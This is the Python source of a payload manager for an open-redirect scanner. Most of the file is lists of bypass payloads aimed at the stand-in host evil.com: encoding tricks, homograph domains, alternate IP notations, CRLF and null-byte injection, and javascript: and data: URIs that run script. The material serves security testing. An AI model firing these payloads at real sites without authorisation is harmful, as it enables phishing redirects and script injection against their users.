"""
Payload management for OpenX scanner
"""

import os
import urllib.parse

class PayloadManager:
    """Manages payloads for open redirect testing"""
    
    def __init__(self, callback_url=None, custom_payloads_file=None, small_mode=False):
        """Initialize payload manager"""
        self.callback_url = callback_url
        self.custom_payloads_file = custom_payloads_file
        self.small_mode = small_mode
        
        # Common redirect parameters (extended list)
        self.all_redirect_params = [
            'url', 'redirect', 'return', 'returnurl', 'return_url',
            'next', 'goto', 'target', 'destination', 'dest',
            'continue', 'forward', 'location', 'site', 'to',
            'redirect_uri', 'callback', 'success_url', 'failure_url',
            'redirectUrl', 'returnUrl', 'nextUrl', 'targetUrl',
            'r', 'u', 'link', 'path', 'page', 'ref', 'referer',
            'exit', 'out', 'away', 'external', 'redir',
            'redirect_to', 'forward_to', 'go_to', 'jump_to'
        ]
        
        # Small mode uses only most common parameters
        self.common_redirect_params = [
            'url', 'redirect', 'return', 'next', 'goto', 'target',
            'redirect_uri', 'callback', 'r', 'u'
        ]
    
    def get_parameters_to_test(self, existing_params=None):
        """Get list of parameters to test"""
        existing_params = existing_params or []
        
        if self.small_mode:
            base_params = self.common_redirect_params
        else:
            base_params = self.all_redirect_params
        
        # Always test existing parameters
        params_to_test = list(set(base_params + list(existing_params)))
        
        return params_to_test
    
    def get_basic_payloads(self):
        """Get basic open redirect payloads"""
        callback = self.callback_url or "http://evil.com"
        
        payloads = [
            # Basic HTTP/HTTPS redirects
            "http://evil.com",
            "https://evil.com",
            callback,
            
            # Protocol-relative URLs
            "//evil.com",
            "///evil.com",
            "////evil.com",
            
            # URL encoding variations
            "http%3A%2F%2Fevil.com",
            "https%3A%2F%2Fevil.com",
            "%2F%2Fevil.com",
            "%2F%2F%2Fevil.com",
            
            # Double URL encoding
            "%252F%252Fevil.com",
            "http%253A%252F%252Fevil.com",
            "https%253A%252F%252Fevil.com",
            
            # Unicode bypasses
            "http://evil.com\u2044",
            "http://evil.com\u2215",
            "http://evil.com\uFF0F",
            
            # Mixed encoding
            "http:/\\/evil.com",
            "http:\\/\\/evil.com",
            "http:/\\evil.com",
            
            # Subdomain confusion
            "http://subdomain.evil.com",
            "https://www.evil.com",
            
            # Path traversal attempts
            "../../../evil.com",
            "..\\..\\..\\evil.com",
            
            # Null byte injection
            "http://evil.com%00",
            "http://evil.com\x00",
            
            # CRLF injection
            "http://evil.com%0d%0a",
            "http://evil.com\r\n",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            "javascript:window.location='http://evil.com'",
            
            # Data protocol
            "data:text/html,<script>window.location='http://evil.com'</script>",
            
            # FTP and other protocols
            "ftp://evil.com",
            "file://evil.com",
            "mailto:test@evil.com"
        ]
        
        return payloads
    
    def get_advanced_payloads(self):
        """Get advanced bypass payloads"""
        callback = self.callback_url or "http://evil.com"
        
        advanced_payloads = [
            # Domain validation bypasses
            "http://evil.com/legitimate-site.com",
            "http://legitimate-site.com.evil.com",
            "http://evil.com@legitimate-site.com",
            "http://legitimate-site.com@evil.com",
            
            # IP address variations
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            
            # Octal/Hex IP bypasses
            "http://0177.0.0.1",  # 127 in octal
            "http://0x7f.0.0.1",   # 127 in hex
            "http://2130706433",   # 127.0.0.1 as decimal
            
            # Unicode domain bypasses
            "http://еvil.com",  # Cyrillic 'e'
            "http://evil.соm",  # Cyrillic 'o'
            
            # IDN homograph attacks
            "http://еvil.com",  # Mixed scripts
            "http://gооgle.com", # Double 'o' with Cyrillic
            
            # Port confusion
            "http://evil.com:80",
            "https://evil.com:443",
            "http://evil.com:8080",
            
            # Whitespace bypasses
            "http://evil.com ",
            " http://evil.com",
            "http://evil.com\t",
            "http://evil.com\r\n",
            
            # Case sensitivity bypasses
            "HTTP://EVIL.COM",
            "Http://Evil.Com",
            "hTTp://eViL.cOm",
            
            # Fragment bypasses
            "http://evil.com#legitimate-site.com",
            "http://evil.com/#/legitimate-site.com",
            
            # Query parameter confusion
            "http://evil.com?legitimate-site.com",
            "http://evil.com?redirect=legitimate-site.com",
        ]
        
        return advanced_payloads
    
    def get_encoding_bypasses(self):
        """Get encoding-based bypass payloads"""
        bypasses = []
        base_payload = "http://evil.com"
        
        # Single URL encoding
        bypasses.append(urllib.parse.quote(base_payload))
        bypasses.append(urllib.parse.quote(base_payload, safe=''))
        
        # Double URL encoding
        single_encoded = urllib.parse.quote(base_payload)
        bypasses.append(urllib.parse.quote(single_encoded))
        
        # HTML entity encoding
        bypasses.append("http&#58;//evil&#46;com")
        bypasses.append("http&#x3A;//evil&#x2E;com")
        
        # Mixed encoding combinations
        bypasses.extend([
            "http%3A//evil.com",
            "http:%2F%2Fevil.com",
            "http://%65vil.com",  # 'e' encoded
            "http://evil%2Ecom",  # '.' encoded
        ])
        
        return bypasses
    
    def load_custom_payloads(self):
        """Load payloads from custom file"""
        if not self.custom_payloads_file:
            return []
        
        try:
            with open(self.custom_payloads_file, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f.readlines()]
                return [p for p in payloads if p and not p.startswith('#')]
        except FileNotFoundError:
            print(f"Warning: Custom payload file not found: {self.custom_payloads_file}")
            return []
        except Exception as e:
            print(f"Error loading custom payloads: {str(e)}")
            return []
    
    def get_payloads(self):
        """Get all payloads for testing"""
        payloads = []
        
        # Add basic payloads
        payloads.extend(self.get_basic_payloads())
        
        # Add advanced payloads if not in small mode
        if not self.small_mode:
            payloads.extend(self.get_advanced_payloads())
            payloads.extend(self.get_encoding_bypasses())
        
        # Add custom payloads
        custom_payloads = self.load_custom_payloads()
        payloads.extend(custom_payloads)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                unique_payloads.append(payload)
        
        return unique_payloads
